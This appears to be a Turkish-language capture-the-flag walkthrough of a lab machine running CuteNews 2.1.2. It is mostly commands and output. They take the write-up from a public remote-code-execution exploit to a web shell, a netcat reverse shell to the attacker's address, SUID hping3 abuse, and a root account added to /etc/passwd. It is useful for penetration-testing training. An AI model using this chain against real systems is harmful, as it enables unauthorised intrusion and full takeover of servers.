@@ -1,0 +1,241 @@
+      ####enumeration
+
+      ####Nmap
+Bir tarama ile başlayacağız :
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap $targetip         
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-26 08:26 EST
+Nmap scan report for $targetip
+Host is up (0.039s latency).
+Not shown: 995 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+88/tcp  open  kerberos-sec
+110/tcp open  pop3
+995/tcp open  pop3s
+
+      ####CURL
+80 numaralı bağlantı noktasına gitmek, varsayılan Apache sunucusu sayfasını sunar:
+┌──(kali㉿kali)-[~]
+└─$ curl http://$targetip | html2text                                         
+...
+[Debian Logo]  Apache2 Debian Default Page
+It works!
+...
+
+      ####GoBuster
+Bu sunucunun gizli dosya ve dizinlerini /usr/share/wordlists/dirb/common.txt kelime listesini kullanarak kaba kuvvet deneyelim .
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://$targetip -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.0.1
+...
+/.htaccess (Status: 403)
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/core (Status: 301)
+/docs (Status: 301)
+/favicon.ico (Status: 200)
+/index.html (Status: 200)
+/index.php (Status: 200)
+/libs (Status: 301)
+/manual (Status: 301)
+/server-status (Status: 403)
+/skins (Status: 301)
+/uploads (Status: 301)
+...
+Bu tarama /index.php sayfasını bulur . Sayfa, yazılım adı ve sürüm bilgilerini içerir:
+┌──(kali㉿kali)-[~]
+└─$ curl http://$targetip/index.php | html2text
+...
+***** Please sign in *****
+User: [username            ]
+Password [********************]
+ ⁰ Remember me
+Sign in Register
+(lost_password)
+
+
+Powered by CuteNews_2.1.2 © 2002–2021 CutePHP.
+(unregistered)
+Uygulama CuteNews v2.1.2 gibi görünüyor .
+
+      ####EXPLOITATION
+
+Uzaktan Kod Yürütme
+Kullanılabilir birkaç istismar keşfettik:
+┌──(kali㉿kali)-[~]
+└─$ searchsploit CuteNews 2.1.2
+------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                        |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                                          | php/remote/46698.rb
+CuteNews 2.1.2 - Arbitrary File Deletion                                                                                                              | php/webapps/48447.txt
+CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                                                  | php/webapps/48458.txt
+CuteNews 2.1.2 - Remote Code Execution                                                                                                                | php/webapps/48800.py
+İki RCE istismarı 46698.rb ve 48800.py en umut verici olanlardır. Metasploit modülü ( 46698.rb ) kullanıcı kimlik bilgilerini gerektirir. 
+Uygulamaya kolayca yeni bir kullanıcı kaydedebilsek de, bu işlemi bizim için otomatikleştirdiği için bunun yerine python RCE exploitini tercih edeceğiz.
+Exploit kodunu saldırı makinemize indirelim.
+┌──(kali㉿kali)-[~]
+└─$ head 48800.py                                                                                                                                                                 130 ⨯
+#! /bin/env python3
+
+import requests
+from base64 import b64decode
+import io
+import re
+import string
+import random
+import sys
+
+Yine de, /CuteNews/ dizinini hedeflediğinden, onu kullanmadan önce istismarda küçük bir ayarlama yapmamız gerekiyor :
+┌──(kali㉿kali)-[~]
+└─$ grep CuteNews 48800.py                    
+    url = f"{ip}/CuteNews/cdata/users/lines"
+    register = sess.post(f"{ip}/CuteNews/index.php?register", data = postdata, allow_redirects = False)
+    token = sess.get(f"{ip}/CuteNews/index.php?mod=main&opt=personal").text
+    payload_send = sess.post(f"{ip}/CuteNews/index.php", files = files).text
+        output = sess.post(f"{ip}/CuteNews/uploads/avatar_{logged_user}_{logged_user}.php", data=postdata)
+index.php sayfasının konumuna bağlı olarak , yazılım /CuteNews/ alt dizinine değil, sunucunun web köküne kurulur . Bu dizini exploit kodundan sileceğiz:
+┌──(kali㉿kali)-[~]
+└─$ sed -i 's:CuteNews/::g' 48800.py
+                                                                                                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ grep CuteNews 48800.py          
+                                                                                                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$
+Artık istismarı başlatmaya hazırız.
+┌──(kali㉿kali)-[~]
+└─$ python3 48800.py
+...
+
+Enter the URL>
+İstismar hedef URL'yi ister. Biz sadece makinenin IP adresini sağlayacağız:
+...
+Enter the URL> http://$targetip
+================================================================
+Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
+================================================================
+[-] No hashes were found skipping!!!
+================================================================
+
+=============================
+Registering a users
+=============================
+[+] Registration successful with username: $usernamecensored and password: $passwordcensored
+
+=======================================================
+Sending Payload
+=======================================================
+signature_key: 9fe22ab12bccb43048247891d46f1530-OyivUaAEOI
+signature_dsi: 1b0cb8c8e8941b0fc403f1e1059899e9
+logged in user: $usernamecensored
+============================
+Dropping to a SHELL
+============================
+
+command > whoami
+www-data
+
+command >
+Bu ilkel web shell aracılığıyla uzaktan kod yürütmeyi başardık. Ardından, bu kabuğu tam bir ters kabuğa yükseltelim.
+
+      ####Reverse Shell
+Netcat'in hedef sistemde kurulu olduğunu ve PATH'imizde olduğunu keşfettik:
+command > which nc
+/usr/bin/nc
+4444 numaralı bağlantı noktasında bir Netcat dinleyicisi kuralım ve ardından web kabuğumuzu kullanarak saldırı makinemize tekrar bağlanalım.
+command > nc $attackerip 4444 -e /bin/bash
+...
+Dinleyicimiz, ters kabuğu aldığımızı belirtiyor.
+┌──(kali㉿kali)-[~]
+└─$ nc -lvp 4444 
+listening on [any] 4444 ...
+$targetip: inverse host lookup failed: Unknown host
+connect to [$attackerip] from (UNKNOWN) [$targetip] 41426
+python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@cute:/var/www/html/uploads$ whoami
+whoami
+www-data
+www-data@cute:/var/www/html/uploads$
+
+
+
+      ####SUID İzinlerini Kötüye Kullanma
+Bir SUID ikili araması ile yerel numaralandırmaya başlayacağız.
+www-data@cute:/var/www/html/uploads$ find / -type f -perm -u=s 2>/dev/null
+find / -type f -perm -u=s 2>/dev/null
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/fusermount
+/usr/bin/passwd
+/usr/bin/mount
+/usr/sbin/hping3
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+Listede /usr/sbin/hping3'ü buluyoruz . Bu yazılımın çok tuhaf bir özelliği var. İkili dosyayı herhangi bir argüman iletmeden çalıştırırsak, doğrudan bir komut kabuğuna düşeriz.
+Bu ikili SUID bit setine sahip olduğundan, komutları yükseltilmiş ayrıcalıklarla yürütebiliriz:
+www-data@cute:/var/www/html/uploads$ id              
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@cute:/var/www/html/uploads$ /usr/sbin/hping3
+/usr/sbin/hping3
+hping3> id
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+hping3> whoami
+whoami
+root
+
+      ####Root SHELL
+Ne yazık ki, şu anda sahip olduğumuz kabuk ile işlemleri kök olarak çalıştıramıyoruz:
+hping3> whoami
+whoami
+root
+hping3> sh
+sh
+$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ exit
+exit
+hping3>
+Ancak sistem dosyalarına yükseltilmiş ayrıcalıklarla yazabiliriz. Bunu kullanarak, /etc/passwd içinde yeni bir kullanıcı tanıtabilir ve ardından bir kök kabukta oturum açabiliriz.
+Şifreli bir hacker kullanıcı oluşturacağız pass123. İlk olarak, parola karmasını oluşturacağız.
+┌──(kali㉿kali)-[~]
+└─$ openssl passwd -1 -salt hacker pass123
+$1$hacker$zVnrpoW2JQO5YUrLmAs.o1
+Bu karma göz önüne alındığında, aşağıdaki satırı /etc/passwd öğesine eklememiz gerekiyor :
+hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0::/root:/bin/bash
+Bu echo dizeyi hedef üzerinde denersek, aşağıdaki hatayı alırız:
+hping3> echo 'hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0::/root:/bin/bash' >> /etc/passwd
+echo 'hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0::/root:/bin/bash' >> /etc/passwd
+can't read "1": no such variable
+hping3>
+$ Karakterlerden kaçmak için önce onu saldırı makinemizde base64 olarak kodlayacağız.
+┌──(kali㉿kali)-[~]
+└─$ echo 'hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0::/root:/bin/bash' | base64
+aGFja2VyOiQxJGhhY2tlciR6Vm5ycG9XMkpRTzVZVXJMbUFzLm8xOjA6MDo6L3Jvb3Q6L2Jpbi9i
+YXNoCg==
+Artık bu dizgiyi, yeni kullanıcıyı eklemek için süreçte kodunu çözerek kullanabiliriz.
+hping3> echo "aGFja2VyOiQxJGhhY2tlciR6Vm5ycG9XMkpRTzVZVXJMbUFzLm8xOjA6MDo6L3Jvb3Q6L2Jpbi9iYXNoCg==" | base64 -d >> /etc/passwd
+echo "aGFja2VyOiQxJGhhY2tlciR6Vm5ycG9XMkpRTzVZVXJMbUFzLm8xOjA6MDo6L3Jvb3Q6L2Jpbi9iYXNoCg==" | base64 -d >> /etc/passwd
+hping3>
+Son olarak, bir kök kabuğu almak için yeni oluşturulan hesabı kullanabiliriz!
+hping3> su hacker
+su hacker
+Password: pass123
+
+root@cute:/var/www/html/uploads# id
+id
+uid=0(root) gid=0(root) groups=0(root)
